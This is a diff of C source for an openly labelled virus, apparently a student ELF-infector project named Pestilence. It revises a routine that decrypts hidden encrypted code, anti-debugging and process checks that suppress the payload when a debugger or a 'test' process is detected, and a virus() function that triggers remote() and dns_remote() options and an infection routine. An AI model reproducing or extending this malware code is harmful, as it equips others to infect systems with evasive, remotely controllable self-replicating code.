@@ -7,10 +7,11 @@
 
 #define PUT(X) {char c = X;CALL(SYS_write, 2, &c, 1);}
 
-int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
+int main(int ac, char **av) asm ("entry");
 
 extern struct s_opt opt;
 
+extern uint64_t iscompressed;
 extern char test_area;
 extern char   key[16];
 
@@ -47,24 +48,16 @@ void change_garbage_code(){
 
 //======================= PESTILENCE =========================
 
-extern void decrypt_block_asm(uint32_t *v, uint32_t *k);
-
-int __attribute__((section (".textearly"))) decryptHiddenCode(){
+int __start decryptHiddenCode(){
 	char *s = ((char*)&crypt_start);
 	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
-
-	for (uint64_t i = 0; i < n; i += 8)
-		if (i + 8 < n)
-			decrypt_block((uint32_t*)(s + i), (uint32_t*)key);
-	//decrypt(s,n,(uint32_t*)key);
+	
+	decrypt(s,n,(uint32_t*)key, iscompressed);
 	//decrypt test area
-	//decrypt(&test_area,15,(uint32_t*)key);
-	// -> error, decrypt dont work
+
+	decrypt(&test_area,15,(uint32_t*)key, FALSE);
 	//check test area
-	for (uint64_t i = 0; i < 15; i += 8)
-		if (i + 8 < 15)
-			decrypt_block((uint32_t*)(char*)&test_area + i, (uint32_t*)key);
-	for (uint64_t i = 0; i < 15; i++)
+	for (int i = 0; i < 15; i++)
 		if ((&test_area)[i] != 'A')
 			return FALSE;
 	return TRUE;
@@ -83,31 +76,30 @@ void do_infection(){
 }
 
 int virus(int ac, char **av){
-	(void)ac;
-	(void)av;
+	debug("Virus");
 	if (opt.do_remote) remote();
 	if (opt.do_dns_remote)
 		dns_remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
-	change_garbage_code();
+	//change_garbage_code();
 	do_infection();
 	return TRUE;
 }
 
-int main(int ac, char **av){
-	char cmp[5];
-	cmp[0] = 't';
-	cmp[1] = 'e';
-	cmp[2] = 's';
-	cmp[3] = 't';
-	cmp[4] = '\0';
+__start void print_debugging(){
+		char s[] = "DEBUGGING...\n";
+		CALL(SYS_write, 1, s, 12);
+}
+
+__start int main(int ac, char **av){
+	char cmp[] = "test";
 	if (checkproc(cmp) == FALSE)
 		return FALSE;
 	//key[0] ^= 0b01110010;
 	if (checkdebug() == 0)
 		return decryptHiddenCode() && virus(ac, av);
 	else
-		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
+		print_debugging();
 	return (0);
 }
